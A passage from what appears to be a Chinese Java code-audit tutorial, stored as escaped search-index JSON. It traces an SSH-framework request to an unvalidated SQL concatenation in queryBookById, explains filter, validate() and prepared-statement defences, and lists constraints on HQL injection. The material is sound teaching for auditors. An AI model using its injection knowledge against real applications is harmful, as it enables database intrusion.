\u5bf9\u8c61\u7684\u5c5e\u6027\u5982\u4f55\u88ab\u8d4b\u503c\u4e4b\u540e\uff0c\u6700\u5173\u952e\u7684\u8fd8\u662fexecute \u65b9\u6cd5\uff0c\u53ef\u4ee5\u770b\u5230\u5728 execute \u65b9\u6cd5\u4e2d\u8c03\u7528\u4e86 bookService. queryAllBook()\u65b9\u6cd5\u3002</p> <p>bookService \u53d8\u91cf\u7684\u7c7b\u578b\u662f BookService\uff0c\u662f\u4e00\u4e2a\u63a5\u53e3\uff0c\u5176\u5185\u5bb9\u5982\u56fe</p> <p></p> <p>\u8be5\u63a5\u53e3\u4e2d\u9488\u5bf9\u5e38\u7528\u7684\u589e\u3001\u5220\u3001\u6539\u3001\u67e5\u5404\u5b9a\u4e49\u5bf9\u5e94\u7684\u62bd\u8c61\u65b9\u6cd5\uff0c\u5e76\u7531 <code>BooksServiceImpl</code>\u6765\u5177\u4f53\u8d1f\u8d23\u5b9e\u73b0\u3002\u5728 BooksServiceImpl \u4e2d\u627e\u5230 <code>queryAllBook</code>\u65b9\u6cd5\uff0c\u5982\u56fe:</p> <p></p> <p>\u8fd9\u91cc\u8c03\u7528\u4e86\u4e00\u4e2a <code>bookManagerDao.queryAllBook</code> \u65b9\u6cd5\uff0cbookManagerDao \u660e\u663e\u662f\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf\uff0c\u89c2\u5bdf\u5176\u7c7b\u578b\u662f <code>BookManagerDao</code> \u7c7b\u578b\uff0c\u5982\u56fe:</p> <p></p> <p>\u8fd9\u91cc\u8981\u8bb2\u5230 Spring \u7684\u4f9d\u8d56\u6ce8\u5165\uff0cBooksServiceImpl \u7c7b\u63d0\u4f9b\u4e86 bookManagerDao \u53d8\u91cf\u7684 setter \u65b9\u6cd5\uff0c\u7136\u540e\u4f7f\u7528 Spring \u7684\u4f9d\u8d56\u6ce8\u5165\u5728 BooksServiceImpl \u7c7b\u5b9e\u4f8b\u5316\u65f6\u901a\u8fc7\u8bfb\u53d6\u914d\u7f6e\u4fe1\u606f\u540e\u8c03\u7528 setter \u65b9\u6cd5\u5c06\u503c\u6ce8\u5165 bookManagerDao \u53d8\u91cf\u4e2d\u3002</p> <p>\u4ee5\u4e0a\u5b9e\u73b0\u7684\u6b65\u9aa4\u5982\u4e0b\uff1a</p> <p>\u5728 <code>BooksServiceImpl</code> \u7c7b\u4e2d\u5b9a\u4e49 <code>bookManagerDao</code> \u53d8\u91cf\uff1a\u9996\u5148\uff0c\u5728 <code>BooksServiceImpl</code> \u7c7b\u4e2d\u5b9a\u4e49\u4e86\u4e00\u4e2a <code>bookManagerDao</code> \u53d8\u91cf\uff0c\u5e76\u63d0\u4f9b\u4e86\u76f8\u5e94\u7684 <code>setter</code> \u65b9\u6cd5\uff0c\u7528\u4e8e\u63a5\u53d7\u6ce8\u5165\u7684\u503c\u3002</p> <p>\u914d\u7f6e Spring \u914d\u7f6e\u6587\u4ef6\uff1a\u5728 Spring \u7684\u914d\u7f6e\u6587\u4ef6\uff08\u5982 applicationContext.xml\uff09\u4e2d\uff0c\u9700\u8981\u914d\u7f6e bean \u5bf9\u8c61\u7684\u5b9a\u4e49\uff0c\u5176\u4e2d\u5305\u62ec BooksServiceImpl \u7c7b\u7684\u5b9a\u4e49\u4ee5\u53ca bookManagerDao \u7684\u5b9a\u4e49\u3002\u540c\u65f6\uff0c\u9700\u8981\u5728\u914d\u7f6e\u4e2d\u6307\u5b9a\u4f9d\u8d56\u6ce8\u5165\u7684\u65b9\u5f0f\u3002</p> <p>\u901a\u8fc7\u914d\u7f6e\u4fe1\u606f\u5b9e\u4f8b\u5316 BooksServiceImpl\uff1a\u5f53 Spring \u5bb9\u5668\u542f\u52a8\u65f6\uff0c\u5b83\u4f1a\u6839\u636e\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684\u5b9a\u4e49\u6765\u5b9e\u4f8b\u5316\u5404\u4e2a bean \u5bf9\u8c61\u3002\u5728\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\uff0c\u4f1a\u521b\u5efa BooksServiceImpl \u5bf9\u8c61\u7684\u5b9e\u4f8b\u3002</p> <p>\u4f9d\u8d56\u6ce8\u5165\uff1a\u5728 <code>BooksServiceImpl</code> \u5b9e\u4f8b\u5316\u7684\u8fc7\u7a0b\u4e2d\uff0cSpring \u4f1a\u68c0\u6d4b\u5230\u5176\u4f9d\u8d56\u4e8e <code>bookManagerDao</code>\u5bf9\u8c61\u3002\u7136\u540e\uff0c\u6839\u636e\u914d\u7f6e\u4fe1\u606f\uff0cSpring \u4f1a\u627e\u5230\u4e0e\u4e4b\u5bf9\u5e94\u7684 bean\uff08\u53ef\u80fd\u662f\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u5b9a\u4e49\u7684\u53e6\u4e00\u4e2a\u7c7b\u7684\u5b9e\u4f8b\uff0c\u6216\u8005\u901a\u8fc7\u5176\u4ed6\u65b9\u5f0f\u5b9a\u4e49\u7684\u5b9e\u4f8b\uff09\uff0c\u5e76\u5c06\u5176\u6ce8\u5165\u5230 <code>BooksServiceImpl</code> \u5b9e\u4f8b\u4e2d\u7684 <code>bookManagerDao</code> \u53d8\u91cf\u4e2d\uff0c\u901a\u8fc7\u8c03\u7528\u5176 setter \u65b9\u6cd5\u5b8c\u6210\u6ce8\u5165\u3002</p> <p>\u5b9e\u73b0\u914d\u7f6e\u4fe1\u606f\u8bfb\u53d6\uff1a\u914d\u7f6e\u4fe1\u606f\u8bfb\u53d6\u53ef\u80fd\u662f\u901a\u8fc7 Spring \u63d0\u4f9b\u7684\u5c5e\u6027\u6ce8\u5165\u3001XML \u914d\u7f6e\u3001\u6ce8\u89e3\u7b49\u65b9\u5f0f\u5b9e\u73b0\u7684\u3002\u4f8b\u5982\uff0c\u53ef\u4ee5\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u4f7f\u7528  \u6807\u7b7e\u6307\u5b9a\u6ce8\u5165\u7684\u503c\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u6ce8\u89e3\u65b9\u5f0f\u6807\u8bb0\u8981\u6ce8\u5165\u7684\u5c5e\u6027\u3002 <p>\u7efc\u4e0a\u6240\u8ff0\uff0c\u901a\u8fc7 Spring \u7684\u4f9d\u8d56\u6ce8\u5165\u673a\u5236\uff0c\u53ef\u4ee5\u5728\u5b9e\u4f8b\u5316 BooksServiceImpl \u7c7b\u65f6\uff0c\u901a\u8fc7\u8bfb\u53d6\u914d\u7f6e\u4fe1\u606f\u5e76\u8c03\u7528\u76f8\u5e94\u7684 setter \u65b9\u6cd5\uff0c\u5c06\u503c\u6ce8\u5165\u5230\u5176\u4e2d\u7684 bookManagerDao \u53d8\u91cf\u4e2d\u3002</p> <p>\u8fd9\u91cc\u63d0\u5230\u4e86\u8bfb\u53d6\u914d\u7f6e\u6587\u4ef6\uff0c\u63a5\u4e0b\u6765\u67e5\u770b\u8be5\u9879\u76ee\u7684 Spring \u914d\u7f6e\u6587\u4ef6\uff0c\u5373 applicationContext.xml \u4e2d\u7684\u914d\u7f6e\u4fe1\u606f\uff0c\u5982\u56fe</p> <p></p> <p>\u9996\u5148\u662f\u5bfc\u5165\u4e86 jdbc \u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u5e76\u914d\u7f6e\u4e86\u8fde\u63a5\u6c60\u548c SessionFactory\u3002\u7136\u540e\u914d\u7f6e\u4e86<code>bookManagerDao</code> \u548c b<code>ookService</code> \u4e24\u4e2a bean\uff0c\u5e76\u5c06 <code>bookManagerDao</code> \u6ce8\u5165<code>bookService</code>\uff0cSpring \u5728\u542f\u52a8\u65f6\u4f1a\u8bfb\u53d6 applicationContext.xml \u5e76\u6839\u636e\u5176\u4e2d\u914d\u7f6e\u7684 bean \u7684\u987a\u5e8f\u5c06\u5176\u9010\u4e2a\u8fdb\u884c\u5b9e\u4f8b\u5316\uff0c\u540c\u65f6\u5bf9\u6bcf\u4e2a bean \u4e2d\u6307\u5b9a\u7684\u5c5e\u6027\u8fdb\u884c\u6ce8\u5165\u3002Spring \u4f9d\u8d56\u6ce8\u5165\u7684\u65b9\u5f0f\u6709\u5f88\u591a\u79cd\uff0c\u8fd9\u91cc\u4ecb\u7ecd\u7684\u901a\u8fc7\u914d\u7f6e xml \u7136\u540e\u901a\u8fc7 setter \u65b9\u6cd5\u8fdb\u884c\u6ce8\u5165\u53ea\u662f\u5176\u4e2d\u4e00\u79cd\u3002</p> <p>\u4ece applicationContext.xml \u914d\u7f6e\u6587\u4ef6\u4e2d\u53ef\u4ee5\u53d1\u73b0 BooksServiceImpl \u7c7b\u4e2d\u7684bookManagerDao \u5b58\u50a8\u7684\u662f\u4e00\u4e2a BookManagerDao \u5bf9\u8c61\uff0c\u6240\u4ee5\u5b9a\u4f4d\u5230 BookManagerDao\u7c7b\u7684 queryAllBook \u65b9\u6cd5\u6765\u770b\u5176\u5177\u4f53\u5b9e\u73b0\uff0c\u5176\u5185\u5bb9\u5982\u56fe</p> <p></p> <p>\u8fd9\u91cc\u8fdb\u884c\u4e86\u4e00\u6b21\u67e5\u8be2\u64cd\u4f5c\uff0c\u5e76\u5c06\u67e5\u8be2\u7684\u7ed3\u679c\u5c01\u88c5\u8fdb\u4e00\u4e2a list \u5bf9\u8c61\u4e2d\u8fdb\u884c\u8fd4\u56de\u3002\u4ee5\u4e0a\u5c31\u662f SSH \u6846\u67b6\u5904\u7406\u4e00\u4e2a\u7528\u6237\u8bf7\u6c42\u7684\u5927\u81f4\u6d41\u7a0b\uff0c\u751f\u4ea7\u73af\u5883\u4e2d\u7684\u4e1a\u52a1\u6bd4\u8f83\u590d\u6742\uff0c\u4f1a\u5bf9\u5404\u79cd\u53c2\u6570\u8fdb\u884c\u5408\u6cd5\u6027\u6821\u9a8c\uff0c\u4f46\u662f\u6574\u4f53\u7684\u5ba1\u8ba1\u601d\u8def\u4e0d\u4f1a\u6539\u53d8\uff0c\u5c31\u662f\u6309\u7167\u7a0b\u5e8f\u6267\u884c\u7684\u6d41\u7a0b\uff0c\u5173\u6ce8\u7a0b\u5e8f\u6bcf\u4e00\u6b65\u5bf9\u4f20\u5165\u53c2\u6570\u7684\u64cd\u4f5c\u3002</p>"},{"location":"Code_audit/Java/Java-5/SSH/index.html#3","title":"3.\u67e5\u8be2\u6848\u4f8b","text":"<p>\u8be5\u9879\u76ee\u4e2d\u6709\u4e00\u4e2a\u6839\u636e ID \u67e5\u8be2\u4e66\u7c4d\u7684\u529f\u80fd\u3002selectBook.jsp \u4e2d\u7684\u8868\u5355\u5185\u5bb9\u5982\u56fe</p> <p></p> <p>\u6839\u636e\u8868\u5355\u63d0\u4ea4\u7684 url \u5728 struts.xml \u4e2d\u67e5\u8be2\uff0c\u627e\u5230\u5904\u7406\u8be5\u8bf7\u6c42\u7684 Action\uff0c\u5982\u56fe</p> <p></p> <p>\u7136\u540e\u5230QueryBookByIdAction\u7c7b\u4e2d\u67e5\u770b\u8be5\u7c7b\u7684execute\u65b9\u6cd5\u7684\u5177\u4f53\u5185\u5bb9\uff0c\u5982\u56fe</p> <p></p> <p>\u7ed3\u5408\u4e4b\u524d\u7684\u8868\u5355\u63d0\u4ea4\u7684\u4e00\u4e2a\u56fe\u4e66\u7684 id\uff0c\u5927\u6982\u53ef\u77e5\u6b64\u5904\u662f\u901a\u8fc7\u4f20\u5165\u7684\u56fe\u4e66 id \u5728\u540e\u53f0\u6570\u636e\u5e93\u4e2d\u8fdb\u884c\u67e5\u8be2\u3002\u6839\u636e\u4e4b\u524d\u7684\u89c2\u5bdf\u5df2\u77e5 <code>bookService</code> \u53d8\u91cf\u6307\u5411\u7684\u662f\u4e00\u4e2a<code>BooksServiceImpl</code>\u5bf9\u8c61\uff0c\u6240\u4ee5\u627e\u5230\u8be5\u7c7b\u4e2d\u7684 <code>queryBookById</code> \u65b9\u6cd5\uff0c\u8be5\u65b9\u6cd5\u7684\u5177\u4f53\u5185\u5bb9\u5982\u56fe\uff1a</p> <p></p> <p>\u540c\u6837\u6839\u636e\u4e4b\u524d\u7684\u89c2\u5bdf\u7ed3\u679c\uff0c\u53ef\u4ee5\u53d1\u73b0 <code>bookManagerDao</code> \u53d8\u91cf\u6307\u5411\u7684\u662f\u4e00\u4e2a<code>BookManagerDao</code> \u5bf9\u8c61\u3002\u5728<code>BookManagerDao</code>\u7c7b\u4e2d\u627e\u5230 <code>queryBookById</code>\u65b9\u6cd5\uff0c\u5982\u56fe</p> <p></p> <p>\u901a\u8fc7\u8fd9\u4e00\u6bb5\u7684\u5ba1\u8ba1\uff0c\u4e0d\u96be\u53d1\u73b0\u56fe\u4e66\u7684 id \u53c2\u6570\u662f\u7531\u524d\u7aef\u4f20\u5165\u7684\uff0c\u6700\u7ec8\u62fc\u63a5\u8fdb\u4e86 SQL\u8bed\u53e5\u4e2d\u5e76\u4ee3\u5165\u6570\u636e\u5e93\u4e2d\u8fdb\u884c\u67e5\u8be2\u3002\u5728\u8fd9\u6574\u4e2a\u6d41\u7a0b\u4e2d\u7a0b\u5e8f\u5e76\u6ca1\u6709\u5bf9 id \u53c2\u6570\u8fdb\u884c\u4efb\u4f55\u6821\u9a8c\uff0c\u56e0\u6b64\u5f88\u6709\u53ef\u80fd\u4ea7\u751f SQL \u6ce8\u5165\u6f0f\u6d1e\u3002</p> <p>\u4ee3\u7801\u5ba1\u8ba1\u7684\u601d\u8def\u5c31\u662f\u8981\u5173\u6ce8\u53c2\u6570\u662f\u5426\u662f\u524d\u7aef\u4f20\u5165\uff0c\u53c2\u6570\u662f\u5426\u53ef\u63a7\uff0c\u5728\u5bf9\u8fd9\u4e2a\u53c2\u6570\u5904\u7406\u7684\u8fc7\u7a0b\u4e2d\u662f\u5426\u6709\u9488\u5bf9\u6027\u5730\u5bf9\u53c2\u6570\u7684\u5408\u6cd5\u6027\u8fdb\u884c\u6821\u9a8c\uff0c\u5982\u679c\u540c\u65f6\u5b58\u5728\u4ee5\u4e0a 3 \u4e2a\u95ee\u9898\uff0c\u5219\u5f88\u53ef\u80fd\u4f1a\u5b58\u5728\u6f0f\u6d1e\u3002</p> <p>\u4ee5\u8be5 SQL \u6ce8\u5165\u6f0f\u6d1e\u4e3a\u4f8b\uff0c\u5e38\u7528\u7684\u9632\u5fa1 SQL \u6ce8\u5165\u7684\u624b\u6bb5\u6709\u4e24\u79cd\uff1a\u4e00\u79cd\u662f\u901a Filter\u8fdb\u884c\u8fc7\u6ee4\uff0c\u53e6\u4e00\u79cd\u662f\u4f7f\u7528\u9884\u7f16\u8bd1\u8fdb\u884c\u53c2\u6570\u5316\u67e5\u8be2\uff0c\u8fd9\u4e24\u79cd\u65b9\u5f0f\u5404\u6709\u4f18\u7f3a\u70b9\uff0c\u4e5f\u6709\u5404\u81ea\u7684\u5e94\u7528\u573a\u666f\u3002</p> <p>Filter\u662fServlet\u81ea\u5e26\u7684\u4e00\u79cd\u6280\u672f\uff0c\u4e5f\u662f\u5728\u4ee3\u7801\u5ba1\u8ba1\u8fc7\u7a0b\u4e2d\u9700\u8981\u7279\u522b\u6ce8\u610f\u7684\u4e00\u4e2a\u70b9\u3002\u7528\u6237\u53ef\u4ee5\u81ea\u5b9a\u4e49\u4e00\u4e2a\u7b80\u5355\u7684\u8fc7\u6ee4\u5668\uff0c\u901a\u8fc7\u5339\u914d\u4f20\u9012\u6765\u7684\u53c2\u6570\u4e2d\u6709\u65e0\u6076\u610f SQL \u8bed\u53e5\u6765\u5224\u65ad\u7a0b\u5e8f\u662f\u5426\u7ee7\u7eed\u6267\u884c\u3002</p> <p>\u81ea\u5b9a\u4e49 Filter \u65f6\u9700\u8981\u5b9e\u73b0 Javax.servlet.Filter \u63a5\u53e3\uff0c\u8be5\u63a5\u53e3\u5185\u5bb9\u5982\u56fe</p> <p></p> <p>\u5ba1\u8ba1\u8fc7\u7a0b\u4e2d\u6700\u9700\u8981\u6ce8\u610f\u7684\u662f\u5176\u4e2d\u7684 doFilter \u65b9\u6cd5\uff0c\u8fc7\u6ee4\u7684\u89c4\u5219\u4e00\u822c\u90fd\u5728\u8be5\u65b9\u6cd5\u4e2d\u3002</p> <p>\u4ee5\u4e0b\u662f\u8be5\u63a5\u53e3\u7684\u4e00\u4e2a\u81ea\u5b9a\u4e49 Filter \u5bf9 doFilter \u65b9\u6cd5\u7684\u5177\u4f53\u5b9e\u73b0\uff0c\u5185\u5bb9\u5982\u56fe</p> <p></p> <p>\u5728 <code>doFilter</code> \u65b9\u6cd5\u4e2d\uff0c\u904d\u5386\u83b7\u53d6\u4e86\u67e5\u8be2\u8bf7\u6c42\u4e2d\u7684\u53c2\u6570\uff0c\u5e76\u5c06\u8bf7\u6c42\u53c2\u6570\u4f20\u9012\u7ed9<code>sqlValidate</code> \u51fd\u6570\u8fdb\u884c\u5339\u914d\uff0c\u6240\u4ee5\u9700\u8981\u518d\u53bb\u89c2\u5bdf <code>sqlValidate</code> \u51fd\u6570\u7684\u5177\u4f53\u5185\u5bb9\uff0c\u5982\u56fe\uff1a</p> <p></p> <p>\u4f20\u9012\u8fdb\u6765\u7684\u53c2\u6570\u4f1a\u5148\u88ab\u8f6c\u5316\u6210\u5c0f\u5199\uff0c\u7136\u540e\u548c basdstr\u4e2d\u5b9a\u4e49\u7684 SQL \u8bed\u53e5\u8fdb\u884c\u6bd4\u5bf9\uff0c\u5982\u679c\u6bd4\u5bf9\u6210\u529f\u5219\u8fd4\u56de flase\uff0c\u8fd4\u56de\u5230 doFilter \u65b9\u6cd5\u4e2d\u5c31\u4f1a\u7ec8\u6b62\u7a0b\u5e8f\u7ee7\u7eed\u6267\u884c\uff0c\u5e76\u91cd\u5b9a\u5411\u81f3 error.jsp \u9875\u9762\u3002</p> <p>Strut2 \u81ea\u8eab\u4e5f\u63d0\u4f9b\u4e86\u9a8c\u8bc1\u673a\u5236\uff0c\u4f8b\u5982 <code>ActionSupport</code> \u7c7b\u4e2d\u63d0\u4f9b\u7684 <code>validate</code>\u65b9\u6cd5\uff0c\u5982\u56fe</p> <p></p> <p>\u5f53\u4e00\u4e2a <code>Action</code> \u4e2d\u91cd\u5199<code>ActionSupport</code> \u4e2d\u7684 <code>validate</code>\u65b9\u6cd5\u540e\uff0c<code>Struts2</code>\u6bcf\u6b21\u6267\u884c\u8be5<code>Action</code> \u65f6\u90fd\u4f1a\u6700\u5148\u6267\u884c\u8be5<code>Action</code> \u4e2d\u7684<code>validate</code>\uff0c\u4ee5\u8d77\u5230\u68c0\u9a8c\u53c2\u6570\u5408\u6cd5\u6027\u7684\u4f5c\u7528\u3002\u8fd9\u91cc\u5c06\u4e4b\u524d <code>Filter</code>\u4e2d<code>doFilter</code> \u65b9\u6cd5\u7684\u8fc7\u6ee4\u89c4\u5219\u76f4\u63a5\u590d\u5236\u8fc7\u6765\u8fdb\u884c\u5c55\u793a\uff0c\u5982\u56fe</p> <p></p> <p>\u5982\u6b64\u4e00\u6765\uff0c\u6bcf\u4e00\u6b21 Struts2 \u6267\u884c <code>QueryBookByIdAction</code> \u7684 <code>execute</code>\u65b9\u6cd5\u65f6\u90fd\u4f1a\u9996\u5148\u8c03\u7528 <code>validate</code> \u65b9\u6cd5\uff0c\u8fd9\u6837\u6bcf\u5f53\u4f20\u5165\u7684\u53c2\u6570\u4e2d\u5305\u542b\u6076\u610f SQL \u8bed\u53e5\u5c31\u4f1a\u7ec8\u6b62\u6267\u884c\u5e76\u91cd\u5b9a\u5411\u81f3<code>error.jsp</code>\uff0c\u6240\u4ee5\u5982\u679c\u5f00\u53d1\u4eba\u5458\u5728\u5f00\u53d1\u8fc7\u7a0b\u4e2d\u6ca1\u6709\u4f7f\u7528 <code>Filter</code>\u6765\u8fdb\u884c\u8fc7\u6ee4\uff0c\u91c7\u7528\u4e0a\u8ff0\u91cd\u5199<code>validate</code> \u65b9\u6cd5\u7684\u65b9\u5f0f\u4e5f\u53ef\u4ee5\u8d77\u5230\u9632\u6b62 SQL \u6ce8\u5165\u7684\u76ee\u7684\u3002</p> <p>\u9664\u4f7f\u7528\u4e0a\u8ff0\u8fc7\u6ee4\u65b9\u5f0f\u6765\u5b9e\u73b0\u9632\u6b62 SQL \u6ce8\u5165\u5916\uff0c\u5728\u5ba1\u8ba1\u8fc7\u7a0b\u4e2d\u8fd8\u6709\u5f88\u91cd\u8981\u7684\u4e00\u70b9\u5c31\u662f\u9884\u7f16\u8bd1\uff0c\u9664\u53ef\u4ee5\u4f7f\u7528\u539f\u751f\u7684 SQL \u8bed\u53e5\u5916\uff0cHibernate \u672c\u8eab\u8fd8\u81ea\u5e26\u4e00\u4e2a\u540d\u4e3a HQL\u7684\u9762\u5411\u5bf9\u8c61\u7684\u67e5\u8be2\u8bed\u8a00\uff0c\u8be5\u8bed\u8a00\u5e76\u4e0d\u88ab\u540e\u53f0\u6570\u636e\u5e93\u6240\u8bc6\u522b\uff0c\u6240\u4ee5\u5728\u6267\u884c HQL \u8bed\u53e5\u65f6\uff0cHibernate\u9700\u8981\u5c06 HQL\u7ffb\u8bd1\u6210 SQL\u8bed\u53e5\u540e\u4ea4\u7531\u540e\u53f0\u6570\u636e\u5e93\u8fdb\u884c\u67e5\u8be2\u64cd\u4f5c\u3002\u5c06\u539f\u751f HQL\u8bed\u53e5\u6539\u5199\u6210 SQL \u8bed\u53e5\uff0c\u53ef\u4ee5\u5f88\u4fbf\u6377\u5730\u5728\u4f17\u591a\u4e0d\u540c\u7684\u6570\u636e\u5e93\u4e2d\u8fdb\u884c\u79fb\u690d\uff0c\u53ea\u9700\u8981\u4fee\u6539\u914d\u7f6e\u800c\u4e0d\u5fc5\u518d\u5bf9 HQL \u8bed\u53e5\u8fdb\u884c\u4efb\u4f55\u6539\u5199\u3002\u4f46\u662f\u8981\u6ce8\u610f\u7684\u4e00\u70b9\u5c31\u662f HQL \u662f\u9762\u5411\u5bf9\u8c61\u7684\u67e5\u8be2\u8bed\u53e5\uff0c\u53ea\u652f\u6301\u67e5\u8be2\u64cd\u4f5c\uff0c\u5bf9\u4e8e\u589e\u3001\u5220\u3001\u6539\u7b49\u64cd\u4f5c\u662f\u4e0d\u652f\u6301\u7684\u3002</p> <p>\u4f7f\u7528\u4e4b\u524d\u7684\u67e5\u8be2\u8bed\u53e5\u6765\u4e3e\u4f8b\uff0cSQL \u8bed\u6cd5\u548c HQL \u8bed\u6cd5\u7684\u7b80\u5355\u533a\u522b\u5982\u56fe</p> <p></p> <p>\u53ef\u4ee5\u53d1\u73b0 SQL \u8bed\u53e5\u662f\u4f9d\u636e bookID \u5b57\u6bb5\u7684\u503c\u4ece SSH_PROJECT \u6570\u636e\u5e93\u7684 BOOKS\u8868\u4e2d\u67e5\u8be2\u51fa\u6307\u5b9a\u7684\u6570\u636e\uff0c\u800c HQL \u7684\u8bed\u53e5\u5219\u66f4\u50cf\u662f\u4ece Books \u5bf9\u8c61\u4e2d\u53d6\u51fa\u6307\u5b9a bookID\u5c5e\u6027\u7684\u5bf9\u8c61\u3002Hibernate \u53ef\u4ee5\u50cf\u8c03\u7528\u5bf9\u8c61\u5c5e\u6027\u4e00\u6837\u8fdb\u884c\u6570\u636e\u67e5\u8be2\uff0c\u662f\u56e0\u4e3a\u4e8b\u5148\u9488\u5bf9\u8981\u67e5\u8be2\u7684 POJO \u5bf9\u8c61\u8fdb\u884c\u6620\u5c04\uff0c\u6620\u5c04\u6587\u4ef6\u7684\u5177\u4f53\u5185\u5bb9\u5982\u56fe</p> <p></p> <p>POJO \u7c7b\u7684\u6bcf\u4e2a\u5c5e\u6027\u90fd\u4e0e\u8868\u4e2d\u7684\u5b57\u6bb5\u8fdb\u884c\u4e00\u4e00\u6620\u5c04\uff0c\u8fd9\u6837 HQL \u624d\u80fd\u7528\u7c7b\u4f3c\u4e8e\u64cd\u4f5c\u5bf9\u8c61\u5c5e\u6027\u7684\u65b9\u5f0f\u8fdb\u884c\u6307\u5b9a\u6570\u636e\u67e5\u8be2\u3002\u4e0e SQL \u8bed\u53e5\u76f8\u4f3c\uff0cHQL \u4e5f\u5b58\u5728\u6ce8\u5165\u95ee\u9898\uff0c\u4f46\u662f\u9650\u5236\u9887\u591a\uff0c\u4ee5\u4e0b\u5217\u4e3e\u4e00\u4e9b HQL \u6ce8\u5165\u7684\u9650\u5236\u3002</p> <pre><code>\uff081\uff09\u65e0\u6cd5\u67e5\u8be2\u672a\u8fdb\u884c\u6620\u5c04\u7684\u8868\u3002\n\uff082\uff09\u5728\u6a21\u578b\u5173\u7cfb\u4e0d\u660e\u786e\u7684\u60c5\u51b5\u4e0b\u65e0\u6cd5\u4f7f\u7528\u201cUNION\u201d\u8fdb\u884c\u67e5\u8be2\u3002\n\uff083\uff09HQL \u8868\u540d\u3001\u5217\u540d\u5bf9\u5927\u5c0f\u5199\u654f\u611f\uff0c\u67e5\u8be2\u65f6\u4f7f\u7528\u7684\u5217\u540d\u5927\u5c0f\u5199\u5fc5\u987b\u4e0e\u6620\u5c04\u7c7b\u7684\n\u5c5e\u6027\u4e00\u81f4\u3002\n\uff084\uff09\u4e0d\u80fd\u4f7f\u7528*\u3001#\u3001--\u3002\n\uff085\uff09\u6ca1\u6709\u5ef6\u65f6\u51fd\u6570\u3002\n</code></pre> <p>\u6240\u4ee5\u5728\u751f\u4ea7\u73af\u5883\u4e2d\u5229\u7528 HQL \u6ce8\u5165\u662f\u4e00\u4ef6\u5f88\u56f0\u96be\u7684\u4e8b\u3002\u4f46\u662f\u9632\u5fa1 HQL \u6ce8\u5165\u65f6\uff0c\u9664\u524d\u9762\u4ecb\u7ecd\u7684\u4f7f\u7528\u8fc7\u6ee4\u5668\u8fdb\u884c\u8fc7\u6ee4\u7684\u65b9\u6cd5\u4ee5\u5916\uff0c\u8fd8\u53ef\u4ee5\u4f7f\u7528\u4e0b\u56fe\u6240\u793a\u7684\u9884\u7f16\u8bd1\u5f62\u5f0f\u3002</p> <p></p>"},{"location":"Code_audit/Java/Java-5/SSM/index.html","title":"Java EE \u5f00\u53d1\u6846\u67b6\u5b89\u5168\u5ba1\u8ba1","text":""},{"location":"Code_audit/Java/Java-5/SSM/index.html#_1","title":"\u5f00\u53d1\u6846\u67b6\u5ba1\u8ba1\u6280\u5de7","text":""},{"location":"Code_audit/Java/Java-5/SSM/index.html#ssm","title":"SSM \u6846\u67b6\u5ba1\u8ba1\u6280\u5de7","text":""},{"location":"Code_audit/Java/Java-5/SSM/index.html#1ssm","title":"1.SSM \u6846\u67b6\u7b80\u4ecb","text":"<p>SSM \u6846\u67b6\uff0c\u5373 Spring MVC+Spring+MyBatis \u8fd9 3 \u4e2a\u5f00\u6e90\u6846\u67b6\u6574\u5408\u5728\u4e00\u8d77\u7684\u7f29\u5199\u3002\u5728 SSM \u6846\u67b6\u4e4b\u524d\uff0c\u751f\u4ea7\u73af\u5883\u4e2d\u591a\u91c7\u7528 SSH \u6846\u67b6\uff08\u7531 Struts2+Spring+Hibernate \u8fd9 3\u4e2a\u5f00\u6e90\u6846\u67b6\u6574\u5408\u800c\u6210\uff09\u3002\u540e\u56e0 Struts2 \u7206\u51fa\u4f17\u591a\u9ad8\u5371\u6f0f\u6d1e\uff0c\u5bfc\u81f4\u76ee\u524d SSM \u9010\u6e10\u4ee3\u66ff SSH\u6210\u4e3a\u4e3b\u6d41\u5f00\u53d1\u6846\u67b6\u7684\u9009\u62e9\u3002</p> <ol> <li>Spring MVC \uff1aSpring MVC \u662f\u4e00\u79cd\u57fa\u4e8eJava\u5b9e\u73b0\u7684MVC\u8bbe\u8ba1\u6a21\u5f0f\u7684\u8bf7\u6c42\u9a71\u52a8\u7c7b\u578b\u7684\u8f7b\u91cf\u7ea7Web\u6846\u67b6\uff0c\u91c7\u7528MVC\u67b6\u6784\u6a21\u5f0f\u7684\u601d\u60f3\uff0c\u5c06Web\u5c42\u8fdb\u884c\u804c\u8d23\u89e3\u8026\u3002\u57fa\u4e8e\u8bf7\u6c42\u9a71\u52a8\u6307\u7684\u662f\u8bf7\u6c42-\u54cd\u5e94\u6a21\u578b\uff0c\u8be5\u6846\u67b6\u7684\u76ee\u7684\u662f\u7b80\u5316\u5f00\u53d1\u8fc7\u7a0b\u3002\u3001</li> <li>Spring \uff1aSpring\u662f\u5206\u5c42\u7684Java SE/EE full-stack\u8f7b\u91cf\u7ea7\u5f00\u6e90\u6846\u67b6\uff0c\u4ee5IoC\uff08Inverse of Control\uff0c\u63a7\u5236\u53cd\u8f6c\uff09\u548c AOP\uff08Aspect Oriented Programming\uff0c\u9762\u5411\u5207\u9762\u7f16\u7a0b\uff09\u4e3a\u5185\u6838\uff0c\u4f7f\u7528\u57fa\u672c\u7684 JavaBean \u5b8c\u6210\u4ee5\u524d\u53ea\u53ef\u80fd\u7531 EJB \u5b8c\u6210\u7684\u5de5\u4f5c\uff0c\u53d6\u4ee3\u4e86 EJB \u81c3\u80bf\u548c\u4f4e\u6548\u7684\u5f00\u53d1\u6a21\u5f0f\u3002Spring \u7684\u7528\u9014\u4e0d\u4ec5\u4ec5\u9650\u4e8e\u670d\u52a1\u5668\u7aef\u7684\u5f00\u53d1\u3002\u4ece\u7b80\u5355\u6027\u3001\u53ef\u6d4b\u8bd5\u6027\u548c\u677e\u8026\u5408\u6027\u89d2\u5ea6\u800c\u8a00\uff0c\u7edd\u5927\u90e8\u5206 Java \u5e94\u7528\u53ef\u4ee5\u4ece Spring \u4e2d\u53d7\u76ca\u3002</li> <li>MyBatis\uff1aMyBatis \u662f\u652f\u6301\u5b9a\u5236\u5316 SQL\u3001\u5b58\u50a8\u8fc7\u7a0b\u4ee5\u53ca\u9ad8\u7ea7\u6620\u5c04\u7684\u4f18\u79c0\u7684\u6301\u4e45\u5c42\u6846\u67b6\u3002MyBatis 